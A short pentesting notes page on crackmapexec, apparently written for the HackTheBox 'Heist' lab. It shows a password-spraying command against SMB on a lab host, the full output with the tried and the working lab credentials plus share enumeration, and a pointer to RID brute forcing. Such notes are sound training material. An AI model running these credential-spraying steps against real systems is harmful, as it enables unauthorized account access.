---
description: apt install crackmapexec -y
---

# crackmapexec

`crackmapexec -u users.txt -p pass.txt --shares 10.10.10.149`

```text
root@kavishgr:~/AutoRecon/results/heistHTB/loot# crackmapexec -u users.txt -p pass.txt --shares 10.10.10.149
CME          10.10.10.149:445 SUPPORTDESK     [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:stealth1agent STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:$uperP@ssword STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:stealth1agent STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\hazard:$uperP@ssword STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [+] SUPPORTDESK\hazard:stealth1agent 
CME          10.10.10.149:445 SUPPORTDESK     [+] Enumerating shares
CME          10.10.10.149:445 SUPPORTDESK     SHARE           Permissions
CME          10.10.10.149:445 SUPPORTDESK     -----           -----------
CME          10.10.10.149:445 SUPPORTDESK     ADMIN$          NO ACCESS
CME          10.10.10.149:445 SUPPORTDESK     IPC$            READ
CME          10.10.10.149:445 SUPPORTDESK     C$              NO ACCESS
[*] KTHXBYE!

```

**Disadvantage:** It stops after finding the first valid credentials.

Explanation:

-- -- -- -- -- -- -- 



crackmapexec can also bruteforce RIDs with --rid-brute

